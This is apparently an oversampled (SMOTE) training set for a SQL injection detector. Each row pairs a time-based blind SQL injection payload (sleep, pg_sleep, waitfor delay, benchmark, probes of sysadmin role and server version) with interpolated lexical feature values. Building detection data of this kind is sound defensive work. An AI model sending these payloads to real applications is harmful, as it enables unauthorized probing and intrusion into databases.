id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000163,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.21428424372222996,45.86120911298376,16.0,2.768761801893881,11.0,0.0,23.907472741989167,10.953736370994585,0.23990227490251706,0.0,0.5212713485439291,0.2388263765535539,0.046263629005415474,1.9074727419891695,0.0,0.0,0.0,1.0,0.0,4.0,0.0,4.0,-5.551115123125783e-17,1.0,0.04626362900541536,0.9537363709945847,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000164,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.8530175388305148,78.26151674730585,27.505807147794236,4.202925427519025,41.04645718235389,4.0,19.540650034559654,13.674409530392314,0.5258794577568374,0.05317574225819647,0.24245633066774092,0.1784884693172252,4.0,0.0,2.0,0.0,0.0,0.0,0.0,2.6744095303923148,0.0,0.8313976174019211,1.0,3.1686023825980785,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.16860238259807875,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1686023825980785
SMOTE_000165,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.716125640225665,38.93548842282412,16.76612789429397,3.2691965691963656,13.0,0.0,14.935488422824118,11.0,0.3344853699895279,0.0,0.38248854771164087,0.28302608229883125,0.0,0.7661278942939702,2.0,0.0,0.0,0.0,0.0,3.23387210570603,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.7661278942939702,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000166,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,2.4732013854723864,31.49078178253838,22.490781782538384,4.341409430502249,16.0,2.0,2.0,11.490781782538384,0.5082131970558326,0.06352664963197907,0.06352664963197907,0.36473350368020935,2.0,0.4907817825383836,2.0,0.0,0.0,0.0,0.49078178253838356,0.0,0.0,4.0,0.5092182174616163,2.0,1.0,0.4907817825383836,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.49078178253838356,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000167,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.2476481112125473,26.804871429249946,17.0,3.911629390651935,12.804871429249946,4.195128570750053,3.0,6.804871429249947,0.4775900285035602,0.15676493688497384,0.11194499389209425,0.2537000407193717,2.804871429249947,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-5.551115123125783e-17,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000168,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.3701401095899824,29.282160654040762,16.07054016351019,3.37728707139396,11.141080327020381,0.0,10.0,8.14108032702038,0.3803422803439317,0.0,0.34187919901733793,0.2777785206387303,0.0,1.0,0.1410803270203802,0.0,0.0,0.0,0.0,2.0,0.0,4.0705401635101905,-5.551115123125783e-17,0.1410803270203802,0.0,1.0,0.0705401635101901,0.92945983648981,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9294598364898101,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.92945983648981
SMOTE_000169,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.21979880117369588,71.65336210769215,28.053067242153844,4.192397882492979,36.37974829599992,3.0530672421538427,18.06134484307686,14.159201726461529,0.5075307463956606,0.04295476231707937,0.24980217249318437,0.1997123187940757,4.0,0.0,2.0,0.0,0.0,0.0,0.0,2.212268968615372,0.0,0.946932757846157,1.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000170,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.8066265130110216,43.261068160300646,17.0,3.137395186869697,13.0,0.7515811657572351,18.509486994543412,11.0,0.302108838547422,0.01670180368349412,0.42555880207511143,0.25563055569397247,0.0,0.24841883424276479,2.0,0.0,0.0,0.0,0.0,3.7515811657572353,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.24841883424276484,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000171,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.1662498273254465,38.03707327664518,17.009268319161297,3.2021546276053705,11.504634159580647,3.523170797903238,15.513902478741942,7.495365840419352,0.30749985610743824,0.07750043167768525,0.4087962696495256,0.2062034425653509,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.252317079790324,0.0,2.9907316808387048,0.2523170797903238,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7476829202096762,0.25231707979032375,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000172,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.0833176483147513,108.50801538445003,29.35763359496633,4.067967296830491,55.86106875973063,4.0,32.5034351647643,16.143511459955104,0.5160237987942968,0.03865161326076829,0.29329078215873955,0.1520338057861953,4.0,0.0,2.0,0.0,0.0,0.0,0.0,5.143511459955104,0.0,0.21412213501122368,1.0,3.785877864988776,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.7858778649887763,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7858778649887763
SMOTE_000173,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.6020848482670724,27.415717976659504,15.207858988329754,3.336145237960693,11.0,0.0,9.207858988329754,7.207858988329752,0.401567180404528,0.0,0.33572251710723855,0.2627103024882334,0.0,0.2078589883297527,0.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.20785898832975266,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000174,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.020541281502337055,100.06209805802712,32.98692672462587,4.063100424804601,39.07190301455772,6.9901950434694005,35.00653663768706,18.993463362312934,0.3904007123691357,0.06988107713787818,0.3498722883813241,0.189845922111662,2.006536637687066,0.0,2.0,0.0,0.0,0.0,0.9967316811564674,6.0,0.0,0.0,1.9967316811564668,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.9967316811564674,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.996731681156467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.996731681156467
SMOTE_000175,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3709438766150647,39.0232600516825,16.0,2.9377929321651672,11.0,0.0,18.68605004306875,9.33721000861375,0.28330869857416247,0.0,0.47705118209612907,0.23964011932970852,1.0,0.0,0.0,0.0,0.0,1.0,0.0,3.3372100086137504,0.0,4.0,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000176,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.1874897388504437,37.27137829824437,16.0,3.1283202360131814,11.817844574561093,0.591077712719454,15.635689149122186,9.22676686184164,0.31780220886161703,0.017384638609395698,0.41863734936605956,0.2461758031629277,0.0,0.0,0.8178445745610925,0.0,0.0,0.0,0.0,3.4089222872805465,0.0,4.4089222872805465,-5.551115123125783e-17,0.8178445745610925,0.0,0.0,0.40892228728054625,0.5910777127194538,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5910777127194538,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5910777127194538
SMOTE_000177,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.29510439209160133,30.668242130833097,21.6682421308331,4.285216711761613,15.73459370466648,2.1990547215001395,2.0663515738333817,10.6682421308331,0.5125068619743565,0.07299530037821107,0.0678913331602588,0.3466065044871737,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7345937046664806,0.93364842616662,2.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000178,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.7272278575444281,31.72262798671296,15.14598549501736,3.1039735606167542,10.145985495017362,1.14233575083044,13.14598549501736,7.288321245847801,0.31701731858945703,0.04104050251882679,0.4164162010075307,0.2255259778841855,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.85766424916956,0.0,3.4306569966782403,-5.551115123125783e-17,0.0,0.0,0.0,0.0,0.8576642491695602,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8576642491695601,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.85766424916956
SMOTE_000179,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.4417711903680188,114.6309796609302,30.689845316695234,4.0325834251560755,55.94113434423494,4.689845316695235,36.54010312220318,17.459896877796822,0.4844122040039678,0.04198047681033717,0.3199097499233413,0.15369756926235367,3.5401031222031767,0.0,2.0,0.0,0.0,0.0,0.2299484388984118,6.0,0.0,0.0,1.2299484388984117,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.2299484388984118,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22994843889841174,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2299484388984117
SMOTE_000180,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.0792820806045408,29.14214759816745,16.0,3.36246100607376,11.0,0.0,10.11371807853396,8.028429519633491,0.3779278306102193,0.0,0.34648660326773684,0.2755855661220439,0.0,1.014214759816745,0.0,0.0,0.0,0.014214759816745026,0.0,2.014214759816745,0.0,4.0,-5.551115123125783e-17,0.014214759816745026,0.0,1.0,0.0,0.985785240183255,0.0,0.014214759816745026,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000181,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.28480040686697655,48.962709546983845,19.67584673343245,3.28810874722636,12.74067738674596,10.708262060089206,19.61101608011894,5.902754020029735,0.26057627247389786,0.21647033109737557,0.4014406811847447,0.12151271524398188,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9351693466864903,0.0,0.0,0.9675846733432449,0.0,0.0,0.0,0.0,0.967584673343245,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9675846733432452,0.0,0.0,0.0,0.0,0.0,0.0,0.032415326656755006,0.967584673343245,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9675846733432452
SMOTE_000182,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.0112370093525545,40.180032771897594,17.0,3.2497068407507532,13.0,0.31143325312822756,15.868599518769367,11.0,0.3255319145996089,0.006920738958405066,0.3920972648577015,0.27545008158428447,0.0,0.6885667468717722,2.0,0.0,0.0,0.0,0.0,3.311433253128228,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.6885667468717722,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000183,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.33269446930340746,34.584972643813046,22.89624316095326,4.285964169739955,16.0,2.0,4.6887294828597845,11.896243160953262,0.4632630762202684,0.05790788452753355,0.13472872689495602,0.34410031235724203,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.8962431609532622,0.0,4.0,1.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.8962431609532621,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000184,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.1605702723316074,38.498659821917684,16.0,3.003165234571666,11.0,0.0,17.74932991095884,9.74932991095884,0.2858730020505236,0.0,0.46101731790220135,0.2531096800472751,0.25067008904116017,1.4986598219176794,0.0,0.0,0.0,1.0,0.0,3.0,0.0,4.0,-5.551115123125783e-17,1.0,0.2506700890411603,0.7493299109588397,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000185,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,2.0289555642886166,36.03523574979719,16.0,3.079078891438404,11.0,0.0,15.882311249855135,9.152924499942054,0.3081830182309543,0.0,0.43812171093589813,0.2536952708331476,0.42353775002897287,1.1529244999420543,0.0,0.0,0.0,1.0,0.0,2.5764622499710272,0.0,4.0,-5.551115123125783e-17,1.0,0.42353775002897287,0.576462249971027,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000186,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.1030214451684706,115.65092124474344,29.70506921163296,4.009514639600613,57.122119336018734,4.528801908724718,36.64746539418352,17.35253460581648,0.49099378193755283,0.040027205223467865,0.31781212570187656,0.1511668871371027,3.647465394183522,0.0,2.0,0.0,0.0,0.0,0.17626730290823936,6.0,0.0,0.0,1.1762673029082393,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.17626730290823936,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17626730290823933,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1762673029082396
SMOTE_000187,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.4817643658635913,104.48002961169014,32.05683587122313,4.053682928241672,44.1874027082728,6.292626903417345,35.471582064388436,18.528417935611564,0.41890916940935835,0.06142037672772298,0.3407863168092175,0.17888413705370115,2.4715820643884365,0.0,2.0,0.0,0.0,0.0,0.7642089678057816,6.0,0.0,0.0,1.7642089678057815,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.7642089678057816,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7642089678057816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7642089678057817
SMOTE_000188,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.06800475668945401,45.0,17.0,3.0740066546775076,13.0,0.9767846653542129,20.0,11.023215334645787,0.28888888888888886,0.021706325896760283,0.4444444444444444,0.2449603407699064,0.0,0.023215334645787178,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.02321533464578715,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000189,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.9289647450290748,27.84689179714169,15.16937835942834,3.3035393343797264,11.0,0.0,9.677513437713355,7.169378359428339,0.39662522017527935,0.0,0.3456838387083163,0.2576909411164043,0.16937835942833823,0.0,0.0,0.0,0.0,0.16937835942833834,0.0,2.0,0.0,4.0,-5.551115123125783e-17,0.16937835942833823,0.1693783594283384,0.0,0.0,0.8306216405716618,0.0,0.16937835942833834,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000190,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.44962419427955586,37.995591374489535,23.440528143307283,4.276244728764809,17.67400694456768,2.0881056286614568,6.057267543937481,12.176211257322914,0.4615572592414229,0.05593892929779375,0.1519778083500473,0.33052600311073604,2.176211257322914,0.0,2.0,0.0,0.0,0.0,0.0,1.088105628661457,0.0,3.7356831140156297,1.0,2.1762112573229135,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.08810562866145694,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0881056286614568
SMOTE_000191,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.16820037079790653,42.703567061075596,16.234522353691865,3.073020177395898,13.0,0.23452235369186525,18.46904470738373,11.0,0.3046844593682631,0.005211607859819237,0.43229400561415654,0.2578099271577611,0.0,0.0,2.0,0.0,0.0,0.0,0.0,4.0,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000192,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.040565048713100404,33.1600450510126,16.982217216554155,3.496452176804578,13.0,0.9822172165541547,10.142262267566764,9.035565566891691,0.3924382498822771,0.029764158077398628,0.30526277367934856,0.2725348183609757,0.0,0.0,2.0,0.0,0.0,0.0,0.0,2.0355655668916905,0.0,5.0,-5.551115123125783e-17,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000193,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,2.5524819617277408,45.56976718293265,16.43023281706735,2.8991817242307967,11.860465634134698,0.0,22.279068731730604,11.430232817067349,0.26053815466567004,0.0,0.48848441993682323,0.2509774253975067,0.0,1.5697671829326507,0.8604656341346986,0.0,0.0,0.5697671829326507,0.0,4.0,0.0,4.430232817067349,-5.551115123125783e-17,1.4302328170673493,0.0,1.0,0.4302328170673493,0.0,0.0,0.5697671829326507,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5697671829326507,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5697671829326507
SMOTE_000194,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.7077628975800149,30.94531358086622,15.563616225838032,3.2370835528680737,11.0,0.5636162258380311,11.818081129190155,7.563616225838031,0.36013240807240915,0.016576947818765626,0.3775385275167083,0.2457521165921169,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.563616225838031,0.0,4.0,-5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
